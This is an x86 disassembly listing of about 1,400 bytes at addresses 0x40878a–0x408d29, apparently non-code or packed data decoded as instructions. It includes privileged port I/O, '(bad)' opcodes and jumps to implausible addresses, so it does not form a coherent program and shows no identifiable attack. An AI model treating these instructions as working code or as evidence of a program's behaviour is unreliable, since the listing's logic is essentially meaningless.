  40878a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40878b:	60                   	pusha
  40878c:	a0 60 93 05 06       	mov    0x6059360,%al
  408791:	05 e0 aa 15 3b       	add    $0x3b15aae0,%eax
  408796:	f9                   	stc
  408797:	ba ff be fb 23       	mov    $0x23fbbeff,%edx
  40879c:	30 b3 2b 38 d3 20    	xor    %dh,0x20d3382b(%ebx)
  4087a2:	29 63 06             	sub    %esp,0x6(%ebx)
  4087a5:	27                   	daa
  4087a6:	e3 64                	jecxz  0x40880c
  4087a8:	a0 60 0a 60 2d       	mov    0x2d600a60,%al
  4087ad:	a3 a6 19 a1 60       	mov    %eax,0x60a119a6
  4087b2:	a0 60 2b 75 4c       	mov    0x4c752b60,%al
  4087b7:	cf                   	iret
  4087b8:	e0 60                	loopne 0x40881a
  4087ba:	88 7a 5d             	mov    %bh,0x5d(%edx)
  4087bd:	5f                   	pop    %edi
  4087be:	9f                   	lahf
  4087bf:	e3 64                	jecxz  0x408825
  4087c1:	64 fb                	fs sti
  4087c3:	23 30                	and    (%eax),%esi
  4087c5:	93                   	xchg   %eax,%ebx
  4087c6:	72 e9                	jb     0x4087b1
  4087c8:	b0 93                	mov    $0x93,%al
  4087ca:	72 e9                	jb     0x4087b5
  4087cc:	f0 64 29 b0 a8 93 72 	lock sub %esi,%fs:-0x168d6c58(%eax)
  4087d3:	e9 
  4087d4:	f0 6c                	lock insb (%dx),%es:(%edi)
  4087d6:	d3 32                	shll   %cl,(%edx)
  4087d8:	29 b0 b0 26 e0 74    	sub    %esi,0x74e026b0(%eax)
  4087de:	a0 26 e0 75 a0       	mov    0xa075e026,%al
  4087e3:	93                   	xchg   %eax,%ebx
  4087e4:	72 e9                	jb     0x4087cf
  4087e6:	f0 76 63             	lock jbe 0x40884c
  4087e9:	b5 2b                	mov    $0x2b,%ch
  4087eb:	4c                   	dec    %esp
  4087ec:	0a 60 0a             	or     0xa(%eax),%ah
  4087ef:	60                   	pusha
  4087f0:	0a 60 0a             	or     0xa(%eax),%ah
  4087f3:	60                   	pusha
  4087f4:	0a 60 f3             	or     -0xd(%eax),%ah
  4087f7:	b6 f7                	mov    $0xf7,%dh
  4087f9:	e9 ed 5c 2b 3a       	jmp    0x3a6be4eb
  4087fe:	2b 50 d3             	sub    -0x2d(%eax),%edx
  408801:	20 f5                	and    %dh,%ch
  408803:	c8 85 d4 e0          	enter  $0xd485,$0xe0
  408807:	60                   	pusha
  408808:	04 5f                	add    $0x5f,%al
  40880a:	d0 c4                	rol    $1,%ah
  40880c:	29 80 2b a5 9c 48    	sub    %eax,0x489ca52b(%eax)
  408812:	03 11                	add    (%ecx),%edx
  408814:	9f                   	lahf
  408815:	5f                   	pop    %edi
  408816:	21 9b a0 60 9f 5f    	and    %ebx,0x5f9f60a0(%ebx)
  40881c:	af                   	scas   %es:(%edi),%eax
  40881d:	e2 d1                	loop   0x4087f0
  40881f:	61                   	popa
  408820:	a0 60 d3 20 f5       	mov    0xf520d360,%al
  408825:	c8 58 d4 e0          	enter  $0xd458,$0xe0
  408829:	60                   	pusha
  40882a:	04 5f                	add    $0x5f,%al
  40882c:	d0 c4                	rol    $1,%ah
  40882e:	29 80 2b a3 ac 93    	sub    %eax,-0x6c535cd5(%eax)
  408834:	72 b2                	jb     0x4087e8
  408836:	f0 ed                	lock in (%dx),%eax
  408838:	e5 50                	in     $0x50,%eax
  40883a:	88 fe                	mov    %bh,%dh
  40883c:	6b 5f 9f 5f          	imul   $0x5f,-0x61(%edi),%ebx
  408840:	15 50 08 5c 14       	adc    $0x145c0850,%eax
  408845:	a0 a0 eb e3 6c       	mov    0x6ce3eba0,%al
  40884a:	a3 a3 b0 a8 d3       	mov    %eax,0xd3a8b0a3
  40884f:	32 f2                	xor    %dl,%dh
  408851:	b0 2d                	mov    $0x2d,%al
  408853:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408854:	8c 48 23             	mov    %cs,0x23(%eax)
  408857:	2b 9f 5f 9f d5 8c    	sub    -0x732a60a1(%edi),%ebx
  40885d:	ed                   	in     (%dx),%eax
  40885e:	e5 54                	in     $0x54,%eax
  408860:	5a                   	pop    %edx
  408861:	63 a0 60 a0 48 ef    	arpl   %esp,-0x10b75fa0(%eax)
  408867:	13 9f 5f 2b b5 94    	adc    -0x6b4ad4a1(%edi),%ebx
  40886d:	eb ed                	jmp    0x40885c
  40886f:	5c                   	pop    %esp
  408870:	2b 26                	sub    (%esi),%esp
  408872:	88 ae 87 5f 9f eb    	mov    %ch,-0x1460a079(%esi)
  408878:	e5 5c                	in     $0x5c,%eax
  40887a:	2b 60 88             	sub    -0x78(%eax),%esp
  40887d:	d8 52 5f             	fcoms  0x5f(%edx)
  408880:	9f                   	lahf
  408881:	e5 60                	in     $0x60,%eax
  408883:	d4 c7                	aam    $0xc7
  408885:	eb e5                	jmp    0x40886c
  408887:	5c                   	pop    %esp
  408888:	2b 60 88             	sub    -0x78(%eax),%esp
  40888b:	ca 52 5f             	lret   $0x5f52
  40888e:	9f                   	lahf
  40888f:	f9                   	stc
  408890:	f2 b0 2b             	repnz mov $0x2b,%al
  408893:	a3 b0 93 72 9b       	mov    %eax,0x9b7293b0
  408898:	f4                   	hlt
  408899:	84 a4 d5 a3 9b a4 84 	test   %ah,-0x7b5b645d(%ebp,%edx,8)
  4088a0:	fa                   	cli
  4088a1:	b8 15 68 21 9b       	mov    $0x9b216815,%eax
  4088a6:	a0 60 9f 5f 13       	mov    0x135f9f60,%al
  4088ab:	75 2b                	jne    0x4088d8
  4088ad:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4088ae:	9c                   	pushf
  4088af:	48                   	dec    %eax
  4088b0:	65 10 9f 5f d3 20 fa 	adc    %bl,%gs:-0x5df2ca1(%edi)
  4088b7:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  4088bc:	89 f2                	mov    %esi,%edx
  4088be:	a0 60 a0 e0 1b       	mov    0x1be0a060,%al
  4088c3:	74 a0                	je     0x408865
  4088c5:	d4 b8                	aam    $0xb8
  4088c7:	ed                   	in     (%dx),%eax
  4088c8:	f5                   	cmc
  4088c9:	58                   	pop    %eax
  4088ca:	2b a5 9c eb a0 48    	sub    0x48a0eb9c(%ebp),%esp
  4088d0:	69 59 9f 5f 2b a5 9c 	imul   $0x9ca52b5f,-0x61(%ecx),%ebx
  4088d7:	eb f5                	jmp    0x4088ce
  4088d9:	58                   	pop    %eax
  4088da:	88 4e 50             	mov    %cl,0x50(%esi)
  4088dd:	5f                   	pop    %edi
  4088de:	9f                   	lahf
  4088df:	ea e3 75 9e 28 14 66 	ljmp   $0x6614,$0x289e75e3
  4088e6:	9e                   	sahf
  4088e7:	28 14 7e             	sub    %dl,(%esi,%edi,2)
  4088ea:	8b 94 2d ad 98 eb e5 	mov    -0x1a146753(%ebp,%ebp,1),%edx
  4088f1:	5c                   	pop    %esp
  4088f2:	2b 60 52             	sub    0x52(%eax),%esp
  4088f5:	62 88 6a 73 5f 9f    	bound  %ecx,-0x60a08c96(%eax)
  4088fb:	eb e5                	jmp    0x4088e2
  4088fd:	5c                   	pop    %esp
  4088fe:	2b b5 98 48 67 10    	sub    0x10674898(%ebp),%esi
  408904:	9f                   	lahf
  408905:	5f                   	pop    %edi
  408906:	8b 78 2d             	mov    0x2d(%eax),%edi
  408909:	b5 98                	mov    $0x98,%ch
  40890b:	eb e5                	jmp    0x4088f2
  40890d:	5c                   	pop    %esp
  40890e:	2b 60 88             	sub    -0x78(%eax),%esp
  408911:	d8 78 5f             	fdivrs 0x5f(%eax)
  408914:	9f                   	lahf
  408915:	eb e5                	jmp    0x4088fc
  408917:	5c                   	pop    %esp
  408918:	2b b5 98 48 4d 10    	sub    0x104d4898(%ebp),%esi
  40891e:	9f                   	lahf
  40891f:	5f                   	pop    %edi
  408920:	2b a5 9c eb a0 48    	sub    0x48a0eb9c(%ebp),%esp
  408926:	eb 5a                	jmp    0x408982
  408928:	9f                   	lahf
  408929:	5f                   	pop    %edi
  40892a:	db a3 b6 d4 a8 eb    	(bad) -0x14572b4a(%ebx)
  408930:	e5 5c                	in     $0x5c,%eax
  408932:	88 a2 50 5f 9f 93    	mov    %ah,-0x6c60a0b0(%edx)
  408938:	60                   	pusha
  408939:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  40893e:	b0 4b                	mov    $0x4b,%al
  408940:	b2 49                	mov    $0x49,%dl
  408942:	eb 0a                	jmp    0x40894e
  408944:	9f                   	lahf
  408945:	5f                   	pop    %edi
  408946:	2b a5 9c 48 cb 10    	sub    0x10cb489c(%ebp),%esp
  40894c:	9f                   	lahf
  40894d:	5f                   	pop    %edi
  40894e:	88 56 4b             	mov    %dl,0x4b(%esi)
  408951:	5f                   	pop    %edi
  408952:	9f                   	lahf
  408953:	93                   	xchg   %eax,%ebx
  408954:	60                   	pusha
  408955:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  40895a:	b0 c8                	mov    $0xc8,%al
  40895c:	8c d4                	mov    %ss,%esp
  40895e:	e0 60                	loopne 0x4089c0
  408960:	2d a5 8c 1a a4       	sub    $0xa41a8ca5,%eax
  408965:	60                   	pusha
  408966:	a0 60 88 90 50       	mov    0x50908860,%al
  40896b:	5f                   	pop    %edi
  40896c:	9f                   	lahf
  40896d:	23 89 aa 4b 5f 9f    	and    -0x60a0b456(%ecx),%ecx
  408973:	4b                   	dec    %ebx
  408974:	8b bf fe bb 2b 45    	mov    0x452bbbfe(%edi),%edi
  40897a:	fd                   	std
  40897b:	23 a0 5f 9f 5f 9f    	and    -0x60a060a1(%eax),%esp
  408981:	61                   	popa
  408982:	a0 60 a0 8d a0       	mov    0xa08da060,%al
  408987:	60                   	pusha
  408988:	a0 b5 2b 4c d3       	mov    0xd34c2bb5,%al
  40898d:	20 f5                	and    %dh,%ch
  40898f:	c8 c5 d5 e0          	enter  $0xd5c5,$0xe0
  408993:	60                   	pusha
  408994:	04 5f                	add    $0x5f,%al
  408996:	d0 c4                	rol    $1,%ah
  408998:	29 80 9f 65 e8 88    	sub    %eax,-0x77179a61(%eax)
  40899e:	e1 60                	loope  0x408a00
  4089a0:	d3 20                	shll   %cl,(%eax)
  4089a2:	fa                   	cli
  4089a3:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  4089a8:	08 8c 15 a0 a0 23 89 	or     %cl,-0x76dc5f60(%ebp,%edx,1)
  4089af:	6a 4b                	push   $0x4b
  4089b1:	5f                   	pop    %edi
  4089b2:	9f                   	lahf
  4089b3:	4b                   	dec    %ebx
  4089b4:	98                   	cwtl
  4089b5:	bd 63 eb 60 e3       	mov    $0xe360eb63,%ebp
  4089ba:	cd a8                	int    $0xa8
  4089bc:	c8 a1 a0 61          	enter  $0xa0a1,$0x61
  4089c0:	63 5f 9f             	arpl   %ebx,-0x61(%edi)
  4089c3:	5f                   	pop    %edi
  4089c4:	9f                   	lahf
  4089c5:	7d a0                	jge    0x408967
  4089c7:	60                   	pusha
  4089c8:	a0 8f f3 ba 10       	mov    0x10baf38f,%al
  4089cd:	b8 13 96 10 c1       	mov    $0xc1109613,%eax
  4089d2:	d4 91                	aam    $0x91
  4089d4:	d4 d8                	aam    $0xd8
  4089d6:	e5 c6                	in     $0xc6,%eax
  4089d8:	eb ca                	jmp    0x4089a4
  4089da:	14 d3                	adc    $0xd3,%al
  4089dc:	eb 97                	jmp    0x408975
  4089de:	fa                   	cli
  4089df:	a9 d7 8b 14 95       	test   $0x95148bd7,%eax
  4089e4:	0c b0                	or     $0xb0,%al
  4089e6:	a0 60 a0 5f 9f       	mov    0x9f5fa060,%al
  4089eb:	5f                   	pop    %edi
  4089ec:	9f                   	lahf
  4089ed:	7c a0                	jl     0x40898f
  4089ef:	60                   	pusha
  4089f0:	a0 b9 cf c7 18       	mov    0x18c7cfb9,%al
  4089f5:	a9 cb cf f9 c2       	test   $0xc2f9cfcb,%eax
  4089fa:	f2 91                	repnz xchg %eax,%ecx
  4089fc:	e8 d9 f1 cc f5       	call   0xf60d7bda
  408a01:	b2 d7                	mov    $0xd7,%dl
  408a03:	97                   	xchg   %eax,%edi
  408a04:	f7 cb ee 8f e1 b9    	test   $0xb9e18fee,%ebx
  408a0a:	e8 b0 ef 60 a0       	call   0xa0a179bf
  408a0f:	60                   	pusha
  408a10:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  408a15:	7d a0                	jge    0x4089b7
  408a17:	60                   	pusha
  408a18:	a0 90 04 a8 f8       	mov    0xf8a80490,%al
  408a1d:	d5 e6                	aad    $0xe6
  408a1f:	c2 d6 d5             	ret    $0xd5d6
  408a22:	06                   	push   %es
  408a23:	d6                   	salc
  408a24:	01 d8                	add    %ebx,%eax
  408a26:	f9                   	stc
  408a27:	ab                   	stos   %eax,%es:(%edi)
  408a28:	e1 92                	loope  0x4089bc
  408a2a:	08 ce                	or     %cl,%dh
  408a2c:	f3 ca f0 c1          	repz lret $0xc1f0
  408a30:	e6 a8                	out    %al,$0xa8
  408a32:	02 d7                	add    %bh,%dl
  408a34:	f9                   	stc
  408a35:	b0 a0                	mov    $0xa0,%al
  408a37:	60                   	pusha
  408a38:	a0 5f 9f 5f 9f       	mov    0x9f5f9f5f,%al
  408a3d:	7c a0                	jl     0x4089df
  408a3f:	60                   	pusha
  408a40:	a0 ad 0c b1 09       	mov    0x9b10cad,%al
  408a45:	ac                   	lods   %ds:(%esi),%al
  408a46:	17                   	pop    %ss
  408a47:	b4 0d                	mov    $0xd,%ah
  408a49:	b3 0d                	mov    $0xd,%bl
  408a4b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408a4c:	1a d9                	sbb    %cl,%bl
  408a4e:	e5 d6                	in     $0xd6,%eax
  408a50:	cb                   	lret
  408a51:	a1 f5 c1 0f a4       	mov    0xa40fc1f5,%eax
  408a56:	03 96 d6 ce cb aa    	add    -0x5534312a(%esi),%edx
  408a5c:	ef                   	out    %eax,(%dx)
  408a5d:	60                   	pusha
  408a5e:	a0 60 a0 5f 9f       	mov    0x9f5fa060,%al
  408a63:	5f                   	pop    %edi
  408a64:	9f                   	lahf
  408a65:	7d a0                	jge    0x408a07
  408a67:	60                   	pusha
  408a68:	a0 b8 19 ad 12       	mov    0x12ad19b8,%al
  408a6d:	92                   	xchg   %eax,%edx
  408a6e:	0f ba                	(bad)
  408a70:	d7                   	xlat   %ds:(%ebx)
  408a71:	a9 e4 a8 ec d9       	test   $0xd9eca8e4,%eax
  408a76:	d4 96                	aam    $0x96
  408a78:	02 98 f6 92 e6 b8    	add    -0x47196d0a(%eax),%bl
  408a7e:	ed                   	in     (%dx),%eax
  408a7f:	a2 0b c3 d4 b4       	mov    %al,0xb4d4c30b
  408a84:	cb                   	lret
  408a85:	b0 a0                	mov    $0xa0,%al
  408a87:	60                   	pusha
  408a88:	a0 b5 2b 4c 59       	mov    0x594c2bb5,%al
  408a8d:	6e                   	outsb  %ds:(%esi),(%dx)
  408a8e:	a0 60 a0 ca a0       	mov    0xa0caa060,%al
  408a93:	ca a0 a9             	lret   $0xa9a0
  408a96:	15 59 f1 b3 f6       	adc    $0xf6b3f159,%eax
  408a9b:	b7 29                	mov    $0x29,%bh
  408a9d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408a9e:	9c                   	pushf
  408a9f:	93                   	xchg   %eax,%ebx
  408aa0:	60                   	pusha
  408aa1:	b5 08                	mov    $0x8,%ch
  408aa3:	ae                   	scas   %es:(%edi),%al
  408aa4:	19 a0 a0 c4 9f 90    	sbb    %esp,-0x6f603b60(%eax)
  408aaa:	04 e9                	add    $0xe9,%al
  408aac:	c0 eb e5             	shr    $0xe5,%bl
  408aaf:	5c                   	pop    %esp
  408ab0:	88 24 4e             	mov    %ah,(%esi,%ecx,2)
  408ab3:	5f                   	pop    %edi
  408ab4:	9f                   	lahf
  408ab5:	93                   	xchg   %eax,%ebx
  408ab6:	60                   	pusha
  408ab7:	b5 08                	mov    $0x8,%ch
  408ab9:	7c 19                	jl     0x408ad4
  408abb:	a0 a0 c4 9f 90       	mov    0x909fc4a0,%al
  408ac0:	04 e9                	add    $0xe9,%al
  408ac2:	c0 27 e5             	shlb   $0xe5,(%edi)
  408ac5:	58                   	pop    %eax
  408ac6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408ac7:	60                   	pusha
  408ac8:	a0 60 5f 8c 48       	mov    0x488c5f60,%al
  408acd:	a0 a0 ed ed 30       	mov    0x30ededa0,%al
  408ad2:	2b 67 d3             	sub    -0x2d(%edi),%esp
  408ad5:	32 88 8a 71 5f 9f    	xor    -0x60a08e76(%eax),%cl
  408adb:	eb e5                	jmp    0x408ac2
  408add:	30 2d b5 74 48 ff    	xor    %ch,0xff4874b5
  408ae3:	43                   	inc    %ebx
  408ae4:	9f                   	lahf
  408ae5:	5f                   	pop    %edi
  408ae6:	23 dd                	and    %ebp,%ebx
  408ae8:	74 60                	je     0x408b4a
  408aea:	af                   	scas   %es:(%edi),%eax
  408aeb:	e4 3f                	in     $0x3f,%al
  408aed:	62 a0 60 2d ad 6c    	bound  %esp,0x6cad2d60(%eax)
  408af3:	93                   	xchg   %eax,%ebx
  408af4:	72 18                	jb     0x408b0e
  408af6:	04 d9                	add    $0xd9,%al
  408af8:	e0 60                	loopne 0x408b5a
  408afa:	88 66 71             	mov    %ah,0x71(%esi)
  408afd:	5f                   	pop    %edi
  408afe:	9f                   	lahf
  408aff:	ed                   	in     (%dx),%eax
  408b00:	e5 2c                	in     $0x2c,%eax
  408b02:	f0 ed                	lock in (%dx),%eax
  408b04:	ed                   	in     (%dx),%eax
  408b05:	28 2b                	sub    %ch,(%ebx)
  408b07:	67 d3 32             	shll   %cl,(%bp,%si)
  408b0a:	88 56 70             	mov    %dl,0x70(%esi)
  408b0d:	5f                   	pop    %edi
  408b0e:	9f                   	lahf
  408b0f:	eb f5                	jmp    0x408b06
  408b11:	28 f8                	sub    %bh,%al
  408b13:	48                   	dec    %eax
  408b14:	89 0f                	mov    %ecx,(%edi)
  408b16:	9f                   	lahf
  408b17:	5f                   	pop    %edi
  408b18:	2b a5 6c ed ed 54    	sub    0x54eded6c(%ebp),%esp
  408b1e:	d3 32                	shll   %cl,(%edx)
  408b20:	88 00                	mov    %al,(%eax)
  408b22:	84 5f 9f             	test   %bl,-0x61(%edi)
  408b25:	ed                   	in     (%dx),%eax
  408b26:	ed                   	in     (%dx),%eax
  408b27:	24 d3                	and    $0xd3,%al
  408b29:	32 2b                	xor    (%ebx),%ch
  408b2b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408b2c:	94                   	xchg   %eax,%esp
  408b2d:	48                   	dec    %eax
  408b2e:	bb 22 9f 5f 23       	mov    $0x235f9f22,%ebx
  408b33:	dd 64 60 af          	frstor -0x51(%eax,%eiz,2)
  408b37:	e4 f3                	in     $0xf3,%al
  408b39:	62 a0 60 2d a5 90    	bound  %esp,-0x6f5ad2a0(%eax)
  408b3f:	48                   	dec    %eax
  408b40:	d5 0e                	aad    $0xe
  408b42:	9f                   	lahf
  408b43:	5f                   	pop    %edi
  408b44:	2d ad 60 93 72       	sub    $0x729360ad,%eax
  408b49:	18 28                	sbb    %ch,(%eax)
  408b4b:	d9 e0                	fchs
  408b4d:	60                   	pusha
  408b4e:	88 12                	mov    %dl,(%edx)
  408b50:	70 5f                	jo     0x408bb1
  408b52:	9f                   	lahf
  408b53:	eb e5                	jmp    0x408b3a
  408b55:	20 f0                	and    %dh,%al
  408b57:	ed                   	in     (%dx),%eax
  408b58:	f5                   	cmc
  408b59:	1c 2b                	sbb    $0x2b,%al
  408b5b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408b5c:	94                   	xchg   %eax,%esp
  408b5d:	48                   	dec    %eax
  408b5e:	97                   	xchg   %eax,%edi
  408b5f:	23 9f 5f 2b b5 5c    	and    0x5cb52b5f(%edi),%ebx
  408b65:	b8 88 ca 52 5f       	mov    $0x5f52ca88,%eax
  408b6a:	9f                   	lahf
  408b6b:	eb 78                	jmp    0x408be5
  408b6d:	e5 7b                	in     $0x7b,%eax
  408b6f:	6f                   	outsl  %ds:(%esi),(%dx)
  408b70:	24 7a                	and    $0x7a,%al
  408b72:	a2 60 a0 eb e5       	mov    %al,0xe5eba060
  408b77:	54                   	push   %esp
  408b78:	88 dc                	mov    %bl,%ah
  408b7a:	4f                   	dec    %edi
  408b7b:	5f                   	pop    %edi
  408b7c:	9f                   	lahf
  408b7d:	eb 90                	jmp    0x408b0f
  408b7f:	8b 93 dc e7 a6 2b    	mov    0x2ba6e7dc(%ebx),%edx
  408b85:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408b86:	94                   	xchg   %eax,%esp
  408b87:	e0 1c                	loopne 0x408ba5
  408b89:	78 9f                	js     0x408b2a
  408b8b:	9e                   	sahf
  408b8c:	14 7c                	adc    $0x7c,%al
  408b8e:	2d a5 58 eb f5       	sub    $0xf5eb58a5,%eax
  408b93:	54                   	push   %esp
  408b94:	2a b4 ba 5f 88 58 4e 	sub    0x4e58885f(%edx,%edi,4),%dh
  408b9b:	5f                   	pop    %edi
  408b9c:	9f                   	lahf
  408b9d:	eb f5                	jmp    0x408b94
  408b9f:	18 2d a5 90 48 f9    	sbb    %ch,0xf94890a5
  408ba5:	0f 9f 5f 8b          	setg   -0x75(%edi)
  408ba9:	7c 2d                	jl     0x408bd8
  408bab:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408bac:	54                   	push   %esp
  408bad:	eb f5                	jmp    0x408ba4
  408baf:	54                   	push   %esp
  408bb0:	2a b4 ba 5f 88 3c 4e 	sub    0x4e3c885f(%edx,%edi,4),%dh
  408bb7:	5f                   	pop    %edi
  408bb8:	9f                   	lahf
  408bb9:	eb f5                	jmp    0x408bb0
  408bbb:	14 2d                	adc    $0x2d,%al
  408bbd:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408bbe:	90                   	nop
  408bbf:	48                   	dec    %eax
  408bc0:	dd 0f                	fisttpll (%edi)
  408bc2:	9f                   	lahf
  408bc3:	5f                   	pop    %edi
  408bc4:	8b 64 e3 ae          	mov    -0x52(%ebx,%eiz,8),%esp
  408bc8:	15 1a 2d ad 50       	adc    $0x50ad2d1a,%eax
  408bcd:	93                   	xchg   %eax,%ebx
  408bce:	72 18                	jb     0x408be8
  408bd0:	48                   	dec    %eax
  408bd1:	d9 e0                	fchs
  408bd3:	60                   	pusha
  408bd4:	88 8c 70 5f 9f eb e5 	mov    %cl,-0x1a1460a1(%eax,%esi,2)
  408bdb:	10 f0                	adc    %dh,%al
  408bdd:	ed                   	in     (%dx),%eax
  408bde:	f5                   	cmc
  408bdf:	0c 2b                	or     $0x2b,%al
  408be1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408be2:	90                   	nop
  408be3:	48                   	dec    %eax
  408be4:	11 23                	adc    %esp,(%ebx)
  408be6:	9f                   	lahf
  408be7:	5f                   	pop    %edi
  408be8:	2b b5 4c b8 88 44    	sub    0x4488b84c(%ebp),%esi
  408bee:	51                   	push   %ecx
  408bef:	5f                   	pop    %edi
  408bf0:	9f                   	lahf
  408bf1:	eb 78                	jmp    0x408c6b
  408bf3:	e5 7b                	in     $0x7b,%eax
  408bf5:	6f                   	outsl  %ds:(%esi),(%dx)
  408bf6:	24 f4                	and    $0xf4,%al
  408bf8:	a1 60 a0 ed e5       	mov    0xe5eda060,%eax
  408bfd:	4c                   	dec    %esp
  408bfe:	88 d6                	mov    %dl,%dh
  408c00:	4d                   	dec    %ebp
  408c01:	5f                   	pop    %edi
  408c02:	9f                   	lahf
  408c03:	26 e5 47             	es in  $0x47,%eax
  408c06:	a0 e3 63 64 2b       	mov    0x2b6463e3,%al
  408c0b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408c0c:	90                   	nop
  408c0d:	48                   	dec    %eax
  408c0e:	87 0e                	xchg   %ecx,(%esi)
  408c10:	9f                   	lahf
  408c11:	5f                   	pop    %edi
  408c12:	2b 50 cb             	sub    -0x35(%eax),%edx
  408c15:	53                   	push   %ebx
  408c16:	af                   	scas   %es:(%edi),%eax
  408c17:	ec                   	in     (%dx),%al
  408c18:	30 60 a0             	xor    %ah,-0x60(%eax)
  408c1b:	60                   	pusha
  408c1c:	e6 e3                	out    %al,$0xe3
  408c1e:	1d 4c a0 d5 f1       	sbb    $0xf1d5a04c,%eax
  408c23:	eb e5                	jmp    0x408c0a
  408c25:	50                   	push   %eax
  408c26:	20 dc                	and    %bl,%ah
  408c28:	b8 5f c2 d4 cf       	mov    $0xcfd4c25f,%eax
  408c2d:	eb e5                	jmp    0x408c14
  408c2f:	50                   	push   %eax
  408c30:	20 dc                	and    %bl,%ah
  408c32:	b8 5f c7 d4 c5       	mov    $0xc5d4c75f,%eax
  408c37:	eb e5                	jmp    0x408c1e
  408c39:	50                   	push   %eax
  408c3a:	20 dc                	and    %bl,%ah
  408c3c:	b8 5f c0 d4 bb       	mov    $0xbbd4c05f,%eax
  408c41:	eb e5                	jmp    0x408c28
  408c43:	50                   	push   %eax
  408c44:	20 dc                	and    %bl,%ah
  408c46:	b8 5f c0 d4 f9       	mov    $0xf9d4c05f,%eax
  408c4b:	ed                   	in     (%dx),%eax
  408c4c:	e5 4c                	in     $0x4c,%eax
  408c4e:	2b b5 90 ea f4 7a    	sub    0x7af4ea90(%ebp),%esi
  408c54:	9f                   	lahf
  408c55:	48                   	dec    %eax
  408c56:	db 0e                	fisttpl (%esi)
  408c58:	9f                   	lahf
  408c59:	5f                   	pop    %edi
  408c5a:	8b a8 20 dd 87 82    	mov    -0x7d7822e0(%eax),%ebp
  408c60:	14 a2                	adc    $0xa2,%al
  408c62:	20 dd                	and    %bl,%ch
  408c64:	87 87 14 9c 2b a5    	xchg   %eax,-0x5ad463ec(%edi)
  408c6a:	90                   	nop
  408c6b:	ea e4 78 9f e8 e5 47 	ljmp   $0x47e5,$0xe89f78e4
  408c72:	8b 90 2b a5 90 ea    	mov    -0x156f5ad5(%eax),%edx
  408c78:	e4 78                	in     $0x78,%al
  408c7a:	9f                   	lahf
  408c7b:	9a e5 47 14 8c 2b a5 	lcall  $0xa52b,$0x8c1447e5
  408c82:	90                   	nop
  408c83:	e0 1c                	loopne 0x408ca1
  408c85:	78 9f                	js     0x408c26
  408c87:	9e                   	sahf
  408c88:	14 82                	adc    $0x82,%al
  408c8a:	2d a5 48 eb f5       	sub    $0xf5eb48a5,%eax
  408c8f:	50                   	push   %eax
  408c90:	2a b4 ba 5f 88 5c 4d 	sub    0x4d5c885f(%edx,%edi,4),%dh
  408c97:	5f                   	pop    %edi
  408c98:	9f                   	lahf
  408c99:	eb f5                	jmp    0x408c90
  408c9b:	08 2d a5 8c 48 fd    	or     %ch,0xfd488ca5
  408ca1:	0e                   	push   %cs
  408ca2:	9f                   	lahf
  408ca3:	5f                   	pop    %edi
  408ca4:	e3 ae                	jecxz  0x408c54
  408ca6:	af                   	scas   %es:(%edi),%eax
  408ca7:	e5 11                	in     $0x11,%eax
  408ca9:	5f                   	pop    %edi
  408caa:	9f                   	lahf
  408cab:	5f                   	pop    %edi
  408cac:	2d ad 40 93 72       	sub    $0x729340ad,%eax
  408cb1:	eb e5                	jmp    0x408c98
  408cb3:	4c                   	dec    %esp
  408cb4:	88 f4                	mov    %dh,%ah
  408cb6:	60                   	pusha
  408cb7:	5f                   	pop    %edi
  408cb8:	9f                   	lahf
  408cb9:	eb e5                	jmp    0x408ca0
  408cbb:	00 2d b5 44 48 35    	add    %ch,0x354844b5
  408cc1:	22 9f 5f 2b b5 44    	and    0x44b52b5f(%edi),%bl
  408cc7:	ed                   	in     (%dx),%eax
  408cc8:	e5 4c                	in     $0x4c,%eax
  408cca:	88 a2 4d 5f 9f e3    	mov    %ah,-0x1c60a0b3(%edx)
  408cd0:	1d 4c a0 6f 24       	sbb    $0x246fa04c,%eax
  408cd5:	16                   	push   %ss
  408cd6:	a0 60 a0 ed ed       	mov    0xededa060,%al
  408cdb:	fc                   	cld
  408cdc:	d3 32                	shll   %cl,(%edx)
  408cde:	58                   	pop    %eax
  408cdf:	28 19                	sub    %bl,(%ecx)
  408ce1:	a0 a0 48 bd 2f       	mov    0x2fbd48a0,%al
  408ce6:	9f                   	lahf
  408ce7:	5f                   	pop    %edi
  408ce8:	2b a5 3c eb f5 4c    	sub    0x4cf5eb3c(%ebp),%esp
  408cee:	88 42 50             	mov    %al,0x50(%edx)
  408cf1:	5f                   	pop    %edi
  408cf2:	9f                   	lahf
  408cf3:	a8 14                	test   $0x14,%al
  408cf5:	96                   	xchg   %eax,%esi
  408cf6:	2d ad 38 93 72       	sub    $0x729338ad,%eax
  408cfb:	18 88 d9 e0 60 88    	sbb    %cl,-0x779f1f27(%eax)
  408d01:	60                   	pusha
  408d02:	6f                   	outsl  %ds:(%esi),(%dx)
  408d03:	5f                   	pop    %edi
  408d04:	9f                   	lahf
  408d05:	5f                   	pop    %edi
  408d06:	15 f8 2d ad 34       	adc    $0x34ad2df8,%eax
  408d0b:	eb a7                	jmp    0x408cb4
  408d0d:	93                   	xchg   %eax,%ebx
  408d0e:	72 48                	jb     0x408d58
  408d10:	91                   	xchg   %eax,%ecx
  408d11:	2e 9f                	cs lahf
  408d13:	5f                   	pop    %edi
  408d14:	9f                   	lahf
  408d15:	d5 34                	aad    $0x34
  408d17:	c8 ac da e0          	enter  $0xdaac,$0xe0
  408d1b:	60                   	pusha
  408d1c:	9f                   	lahf
  408d1d:	d5 8c                	aad    $0x8c
  408d1f:	ed                   	in     (%dx),%eax
  408d20:	e5 4c                	in     $0x4c,%eax
  408d22:	5a                   	pop    %edx
  408d23:	64 a0 60 a0 48 2d    	mov    %fs:0x2d48a060,%al
  408d29:	0e                   	push   %cs
